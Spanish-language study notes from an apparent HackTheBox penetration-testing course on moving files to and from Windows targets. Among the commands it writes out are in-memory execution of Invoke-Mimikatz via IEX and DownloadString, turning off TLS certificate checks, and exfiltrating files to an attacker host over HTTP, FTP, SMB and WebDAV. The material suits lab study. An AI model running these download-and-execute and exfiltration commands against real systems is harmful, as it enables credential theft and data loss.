- Ver también el protocolo [[FTP - Transferencia de datos]]
----------------
### Operaciones de descarga

Imaginemos que tenemos acceso a una máquina MS02, y necesitamos descargar un archivo desde nuestra máquina Kali. Hay distintas formas de conseguir esto:

#### PowerShell codificar y decodificar Base64

Dependiendo del tamaño del archivo que queramos transferir, podemos usar diferentes métodos que no requieren comunicación a través de la red. Si tenemos acceso a una terminal, podemos codificar un archivo a una cadena base64, copiar su contenido desde la terminal y realizar la operación inversa, decodificando el archivo al contenido original. Veamos cómo podemos hacer esto con PowerShell. 
Un paso esencial al utilizar este método es asegurarse de que el archivo que codificamos y decodificamos sea el correcto. Podemos usar [md5sum](https://man7.org/linux/man-pages/man1/md5sum.1.html), un programa que calcula y verifica sumas de verificación MD5 de 128 bits. La función hash MD5 actúa como una huella digital compacta de un archivo, lo que significa que un archivo debería tener el mismo hash MD5 en todas partes. Intentemos transferir una clave ssh de ejemplo. Puede ser cualquier otra cosa, desde nuestro Pwnbox hasta el objetivo en Windows.

##### Comprobando el Hash MD5

```shell-session
amr251@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

##### Codificar clave SSH a Base64

```shell-session
amr251@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KY...
```

Podemos copiar el contenido obtenido y pegarlo en una PowerShell, para después usar sus funciones para decodificarlo:

```powershell-session
PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBS...="))
```

Finalmente, podemos confirmar que el archivo se envió correctamente usando el cmdlet `Get-FileHash`, que hace exactamente lo mismo que `md5sum`.
##### Confirmar que los hashes MD5 coinciden

```powershell-session
PS C:\htb> Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
MD5             4E301756A07DED0A2DD6953ABF015278                                       C:\Users\Public\id_rsa
```

### PowerShell - Descargas Web

La mayoría de las empresas permiten el tráfico saliente HTTP y HTTPS a través del firewall para facilitar la productividad de los empleados. Aprovechar estos métodos de transporte para operaciones de transferencia de archivos es muy conveniente. Sin embargo, los defensores pueden utilizar soluciones de filtrado web para evitar el acceso a categorías específicas de sitios web, bloquear la descarga de tipos de archivos (como .exe), o solo permitir el acceso a una lista de dominios en lista blanca en redes más restringidas.

PowerShell ofrece muchas opciones para la transferencia de archivos. En cualquier versión de PowerShell, la clase **System.Net.WebClient** se puede utilizar para descargar un archivo a través de HTTP, HTTPS o FTP. La siguiente tabla describe los métodos de **WebClient** para descargar datos desde un recurso:

| Método                | Descripción                                                                 |
|-----------------------|-----------------------------------------------------------------------------|
| OpenRead              | Devuelve los datos de un recurso como un Stream.                            |
| OpenReadAsync         | Devuelve los datos de un recurso sin bloquear el hilo de llamada.           |
| DownloadData          | Descarga datos de un recurso y devuelve un arreglo de bytes (Byte array).   |
| DownloadDataAsync     | Descarga datos de un recurso y devuelve un arreglo de bytes sin bloquear el hilo de llamada. |
| DownloadFile          | Descarga datos de un recurso a un archivo local.                           |
| DownloadFileAsync     | Descarga datos de un recurso a un archivo local sin bloquear el hilo de llamada. |
| DownloadString        | Descarga una cadena (String) de un recurso y devuelve una cadena.           |
| DownloadStringAsync   | Descarga una cadena (String) de un recurso sin bloquear el hilo de llamada. |
##### Descarga de archivos

Podemos especificar el nombre de clase `Net.WebClient` y el método `DownloadFile` con los parámetros correspondientes a la URL del archivo objetivo a descargar y el output.

```powershell-session
PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

PS C:\htb> # Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
PS C:\htb> (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```
##### PowerShell DownloadString - Método sin archivos

Como discutimos anteriormente, los ataques sin archivos funcionan utilizando algunas funciones del sistema operativo para descargar la carga útil (payload) y ejecutarla directamente. PowerShell también se puede utilizar para realizar ataques sin archivos. En lugar de descargar un script de PowerShell en el disco, podemos ejecutarlo directamente en la memoria utilizando el cmdlet **Invoke-Expression** o el alias **IEX**.

```powershell-session
PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
```

`IEX` también acepta pipelines (`|`)

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

##### PowerShell Invoke-Request

Desde PowerShell 3.0 en adelante, este cmdlet está disponible, aunque es bastante lento descargando archivos. Es más conveniente utilizar `iwr`, `curl`, y `wget` que `Invoke-WebRequest`.

```powershell-session
PS C:\htb> Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```

#### Errores comunes con PowerShell

Es posible que no se pueda completar una descarga con `Invoke-WebRequest` porque la configuración de Internet Explorer no se ha completado. En este caso, simplemente añadimos el parámetro `-UseBasicParsing`.

```powershell-session
PS C:\htb> Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Otro error sucede si no se confía en el certificado SSL/TLS . Podemos saltarnos esto de la siguiente manera:

```powershell-session
PS C:\htb> [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

### Descargas SMB

Ver también el protocolo [[SMB - Server Message Block]]. Corre en el puerto TCP 445. Vamos a ver cómo crear un servidor SMB:

```shell-session
amr251@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare

Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
```

Para descargar un archivo del servidor SMB al directorio actual de trabajo, podemos hacer lo siguiente:

```cmd-session
C:\htb> copy \\192.168.220.133\share\nc.exe

        1 file(s) copied.
```

Nuevas versiones de Windows bloquean acceso de invitado no autenticado.

#### Creando un servidor SMB con usuario y contraseña

```shell-session
amr251@htb[/htb]$ sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

#### Montando un servidor SMB con usuario y contraseña

```cmd-session
C:\htb> net use n: \\192.168.220.133\share /user:test test

The command completed successfully.

C:\htb> copy n:\nc.exe
        1 file(s) copied.
```

### Descargas FTP

Ver también el protocolo [[FTP - Transferencia de datos]]. Por defecto usan el puerto TCP 20 y 21. Podemos usar el cliente FTP o PoweShell Net.WebClient para descargar archivos del servidor FTP. Podemos configurar un servidor FTP utilizando el módulo de Python3 `pyftpdlib`:

```bash
sudo pip3 install pyftpdlib
```

Por defecto, este módulo usa el puerto 2121, podemos modificarlo con `--port`. Si no especificamos usuario y contraseña, se permite el acceso no autenticado. 

#### Transfiriendo archivos usando PowerShell

```powershell-session
PS C:\htb> (New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```

Cuando obtenemos una shell en una máquina remota, es posible que no tengamos una shell interactiva. En ese caso, podemos crear un archivo de comandos FTP para descargar un archivo. Primero, necesitamos crear un archivo que contenga los comandos que queremos ejecutar y luego usar el cliente FTP para ejecutar ese archivo y descargar el archivo deseado.

Podemos crear un archivo de comando para el cliente FTP y descargar el archivo objetivo:

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### Operaciones de subida

También existen situaciones como el descifrado de contraseñas, análisis, exfiltración, etc., donde debemos cargar archivos desde nuestra máquina objetivo a nuestro host de ataque. Podemos utilizar los mismos métodos que usamos para las operaciones de descarga, pero ahora para cargas. Veamos cómo podemos lograr cargar archivos de diversas maneras. 

#### PowerShell Base64 - Codificar y Decodificar

```powershell-session
PS C:\htb> [Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))

IyBDb3B5...
PS C:\htb> Get-FileHash "C:\Windows\system32\drivers\etc\hosts" -Algorithm MD5 | select Hash

Hash
----
3688374325B992DEF12793500307566D
```

Copiamos este contenido y lo pegamos en nuestra máquina atacante. Usamos el comando `base64` para decodificarlo, y usar el `md5sum` para confirmar que se ha transferido correctamente

```bash
echo "Iy67..." | base64 -d > data
md5sum data
```

#### Powershell - Subida Web

PowerShell no tiene una función integrada para operaciones de carga, pero podemos usar `Invoke-WebRequest` o `Invoke-RestMethod` para construir nuestra función de carga. También necesitaremos un servidor web que acepte cargas, lo cual no es una opción predeterminada en la mayoría de las utilidades de servidor web comunes.​[Digital Garden](https://dcollao.pages.dev/CPTS/A/5/2/1/?utm_source=chatgpt.com)

Para nuestro servidor web, podemos usar `uploadserver`, un módulo extendido del módulo `http.server` de Python, que incluye una página de carga de archivos. Vamos a instalarlo y a iniciar el servidor web

```bash
pip3 install uploadserver
python3 -m uploadserver
```

Ahora podemos usar el script PowerShell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) que usa `Invoke-RestMethod` para realizar operaciones de subida. El script acepta dos parámetros `-File`, que usamos para especificar la ruta del archivo, y el parámetro `-Uri` la URL del servidor donde vamos a subir nuestro fichero.

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

​Otra forma de utilizar PowerShell y archivos codificados en base64 para operaciones de carga es empleando `Invoke-WebRequest` o `Invoke-RestMethod` junto con Netcat. En este método, Netcat escucha en un puerto específico, y PowerShell envía el archivo como una solicitud POST. Posteriormente, se captura la salida y se utiliza la función de decodificación base64 para convertir la cadena en base64 de nuevo en un archivo.

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

También, si tenemos un servidor en escucha desde el que queremos subir un archivo, desde Windows podemos abrir una PowerShell y descargarlo, haciendo lo siguiente:

**1. Creando servidor en local**

```bash
python -m http.server 80
```

(Imaginemos que hemos abierto el servidor local en la ruta donde se encunetra el archivo a subir)

**2. Descargando desde PowerShell**

```PowerShell
iwr -uri http://<IP_atacante>/upload_win.zip -outfile upload_file.zip
```
### Subidas SMB

Comúnmente, las organizaciones no permiten el protocolo SMB (TCP/445) fuera de su red interna debido a los riesgos de seguridad asociados. Una alternativa es ejecutar SMB sobre HTTP utilizando WebDAV. WebDAV (RFC 4918) es una extensión de HTTP que permite a un servidor web comportarse como un servidor de archivos, soportando la autoría colaborativa de contenido. Además, WebDAV puede operar sobre HTTPS, proporcionando una capa adicional de seguridad.

![[Pasted image 20250408154651.png | 800]]

Para instalar WebDav, instalamos los módulos necesarios de Python:

```bash
pip3 install wsgidav cheroot
```

Después, para usarlo:

```bash
sudo wsgidaw --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

Y finalmente, nos conectamos al directorio `DavWWWRoot`

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

Hay que tener en cuenta que `DavWWWWRoot` es un keyword especial reconocido por el shell de Windows, y dicho directorio no existe en nuestro servidor WebDAV.

##### Subiendo archivos usando SMB

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### Subidas FTP

​Subir archivos utilizando FTP es muy similar a descargarlos. Podemos emplear PowerShell o el cliente FTP para realizar esta operación. Antes de iniciar nuestro servidor FTP con el módulo de Python `pyftpdlib`, es necesario especificar la opción `--write` para permitir que los clientes suban archivos a nuestro host de ataque.

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Ahora, desde PowerShell, podemos subir un archivo:

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

O podemos crear un archivo de comando para el cliente FTP para subir un archivo:

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

### Conexión mediante RDP a windows

Para hacer esto, usaremos el comando `xfreerdp`. Lo primero será instalarlo, siguiendo estos pasos:

1. Como siempre antes de instalar un paquete: `sudo apt update`
2. Instalar xfreerdp: `sudo apt install freerdp3-x11`

Parece muy sencillo, pero igual nos da problemas. Verificamos primero que existe:

```bash
1. dpkg -L freerdp3-x11 #Debería encontrar la ruta correctamente
2. sudo find / -type f -name xfreerdp
3. cd /usr/share/bash-completion/completions #La ruta será esta o alguna otra
4. sudo chmod +x xfreerdp
```

Con esto ya podríamos usar RDP sin problema. El uso es el siguiente:

```bash
xfreerdp /v:<IP_REMOTA> /u:Usuario /p:Password /dynamic-resolution
```

### Transferencia de archivos por sesión de PowerShell

**PowerShell Remoting** nos permite ejecutar scripts o comandos en una computadora remota utilizando sesiones de PowerShell. Los administradores comúnmente usan PowerShell Remoting para gestionar computadoras remotas en una red, y también podemos usarlo para operaciones de transferencia de archivos. Por defecto, al habilitar PowerShell Remoting se crean tanto un listener HTTP como un listener HTTPS. Los listeners se ejecutan en los puertos predeterminados TCP/5985 para HTTP y TCP/5986 para HTTPS.

Para crear una sesión de PowerShell Remoting en una computadora remota, necesitaremos acceso administrativo, ser miembros del grupo **Remote Management Users** o tener permisos explícitos para PowerShell Remoting en la configuración de la sesión. Vamos a crear un ejemplo y transferir un archivo de **DC01** a **DATABASE01** y viceversa.

Tenemos una sesión como **Administrador** en **DC01**, el usuario tiene derechos administrativos en **DATABASE01**, y PowerShell Remoting está habilitado. Vamos a usar **Test-NetConnection** para confirmar que podemos conectarnos a **WinRM**.

```powershell-session
PS C:\htb> whoami

htb\administrator

PS C:\htb> hostname

DC01
```

```powershell-session
PS C:\htb> Test-NetConnection -ComputerName DATABASE01 -Port 5985

ComputerName     : DATABASE01
RemoteAddress    : 192.168.1.101
RemotePort       : 5985
InterfaceAlias   : Ethernet0
SourceAddress    : 192.168.1.100
TcpTestSucceeded : True
```

Como esta sesión ya tiene privilegios sobre `DATABASE01`, no necesitamos especificar credenciales. Vamos a crear una sesión al ordenador remoto llamada `DATABASE01` y guardar los resultados en la variables `$session`

```powershell-session
PS C:\htb> $Session = New-PSSession -ComputerName DATABASE01
```

##### Copiando samplefile.txt desde nuestro localhost a la sesión

```powershell-session
PS C:\htb> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

##### Copiando DATABASE.txt desde la sesión a nuestro localhost

```powershell-session
PS C:\htb> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

##### Montando un directorio Linux usando xfreerdp

```shell-session
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer /dynamic-resolution
```

Para acceder al directorio desde el Windows remoto, podemos conectarnos a `\\tsclient\`.

![[Pasted image 20250409125008.png | 600]]

### Subiendo un archivo desde Windows 

Vamos a revisar formas de subir un archivo desde un Windows remoto a nuestro host Linux.

##### Mediante un servidor SMB

1. Montar el recurso compartido desde nuestro host

```bash
mkdir /tmp/share
cd /tmp/share
impacket-smbserver sharename /tmp/share -smb2support
```

- `sharename`: el nombre del recurso (ponle algo sencillo).
- `-smb2support`: importante para compatibilidad con Windows modernos.

2. Subir el archivo desde Windows

```powershell
copy C:\path\to\file.zip \\10.10.XX.XX\sharename\
```

Si falla por autenticación, forzamos a Windows a que el recurso:

```powershell
net use \\10.10.14.XX\sharename /user:test test
```

Si nos sale un error como este, tendremos que buscar otra forma de realizar la subida.

![[windows_error_smb.png]]

##### Montar un servidor web desde nuestro host que reciba archivos vía PUT

1. Montar el servidor desde nuestro host kali

```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import os

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        path = self.translate_path(self.path)
        length = int(self.headers['Content-Length'])
        content = self.rfile.read(length)
        with open(os.path.basename(path), 'wb') as f:
            f.write(content)
        self.send_response(200)
        self.end_headers()

    def translate_path(self, path):
        return path.strip("/")

httpd = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
print("Listening on port 8080 for PUT requests...")
httpd.serve_forever()

```

Ejecutamos el script y lo dejamos en segundo plano

2. Subir el archivo desde el Windows remoto

```powershell
Invoke-RestMethod -Uri http://10.10.14.82:8080/INLANEFREIGHT.zip -Method PUT -InFile "C:\Tools\20250702221541_INLANEFREIGHT.zip"
```

